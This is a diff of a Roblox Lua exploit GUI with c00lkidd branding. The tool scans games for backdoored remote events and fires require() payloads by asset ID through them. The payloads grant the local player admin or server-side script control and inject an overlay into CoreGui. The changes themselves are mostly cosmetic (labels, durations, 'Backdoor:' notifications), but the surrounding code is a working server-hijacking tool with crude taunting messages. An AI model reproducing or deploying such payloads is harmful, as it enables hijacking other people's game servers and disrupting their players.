@@ -611,7 +611,7 @@ Converted["_Log1"].Name = "Log"
 Converted["_Log1"].Parent = Converted["_Presets"]
 
 Converted["_Trash"].Font = Enum.Font.Cartoon
-Converted["_Trash"].Text = "Mr Bean Admin"
+Converted["_Trash"].Text = "Seeing hand"
 Converted["_Trash"].TextColor3 = Color3.fromRGB(255, 0, 0)
 Converted["_Trash"].TextScaled = true
 Converted["_Trash"].TextSize = 14
@@ -1479,7 +1479,7 @@ local function BEEKENZ_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 		game.StarterGui:SetCore("SendNotification",{
 			Title = "c00lkidd",
 			Text = "c00lkidd fUck roBLOX",
-			Duration = 12
+			Duration = 5
 		})
 	
 	end)
@@ -2403,8 +2403,8 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 	script.Parent.Framee.rsix.MouseButton1Click:Connect(function()
 		fireRemoteEvent('require(3436957371):r6("' .. game.Players.LocalPlayer.Name .. '")')
 	end)
-	script.Parent.Presets.Trash.MouseButton1Click:Connect(function()
-		script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(92684888032460)({Owners = {"' .. game.Players.LocalPlayer.Name .. '"}})'
+	script.Parent.Presets.Trash.MouseButton1Click:Connect(function() -- All Seeing Hand
+		script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(5375399205).Player("' .. game.Players.LocalPlayer.Name .. '")'
 		script.Parent.Framee.Visible = true
 		script.Parent.Presets.Visible = false
 		script.Parent.Logs.Visible = false
@@ -2487,7 +2487,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 		if bg == 1 then
 			bg = 2
 			script.Parent.bg.Visible = true
-			script.Parent.Logs.BG.Text = "Background: k"
+			script.Parent.Logs.BG.Text = "Background: Not c00l"
 			return
 		end
 		if bg == 2 then
@@ -2516,12 +2516,12 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 		if remoteEvent or remoteFunction then
 			script.Parent.Framee.Check.Visible = false
 			script.Parent.Framee.Log.Visible = true
-			script.Parent.Framee.Log.Text = "[" .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "Unknown") .. "]"
+			script.Parent.Framee.Log.Text = "[" .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "Unknown") .. "]," .. "[Code 4]"
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(159, 226, 191)
 			game.StarterGui:SetCore("SendNotification",{
 			Title = "c00lkidd",
-			Text = "Found in:" .. scanTime .."s " .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "nil"),
-			Duration = 10
+			Text = "Backdoor: " .. scanTime .."s " .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "nil"),
+			Duration = 4
 		})
 				local LigmaProject = Instance.new("ScreenGui")
                                 local ImageLabeeel = Instance.new("ImageLabel")
@@ -2535,10 +2535,8 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
                         fireRemoteEvent('require(3986243232).load("im gay",{"' .. game.Players.LocalPlayer.Name ..  '"})')
                       end)
                    if not success then 
-                     print("Error: ", result)
+                     warn("Error: ", result)
 		end		
-
-
 LigmaProject.Name = "LigmaProject"
 LigmaProject.Parent = game.CoreGui
 
@@ -2559,9 +2557,9 @@ fr6.BackgroundTransparency = 1.000
 fr6.Position = UDim2.new(0, 0, -0.633333325, 0)
 fr6.Size = UDim2.new(0, 90, 0, 50)
 fr6.Font = Enum.Font.Arcade
-fr6.Text = "R6"
+fr6.Text = "R15 -> R6"
 fr6.TextColor3 = Color3.fromRGB(255, 0, 0)
-fr6.TextScaled = true
+fr6.TextScaled = false
 fr6.TextSize = 18.000
 fr6.TextTransparency = 0
 fr6.TextWrapped = true
@@ -2589,7 +2587,7 @@ local function UpdateVisibilityBasedOnRigType()
     local btn = fr6
     wait(1)
     ImageLabeeel:TweenPosition(UDim2.new(0.458, 0, 0.408, 0), "Out", "Linear", 0.4, false)
-    wait(3)
+    wait(2)
     ImageLabeeel:TweenPosition(UDim2.new(0.01, 0, 0.813, 0), "Out", "Sine", 0.7, false)
     wait(1)
     TweenService:Create(txt, TweenInfo.new(1, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {["BackgroundTransparency"] = 0}):Play()
@@ -2639,7 +2637,7 @@ end)
 
 UpdateVisibilityBasedOnRigType()
 		else
-			script.Parent.Framee.Check.Text = "No Backdoor found :-("
+			script.Parent.Framee.Check.Text = "[No Backdoor],[Code 0]"
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(226, 69, 69)
 			wait(1)
 			script.Parent.Framee.scan.Visible = true
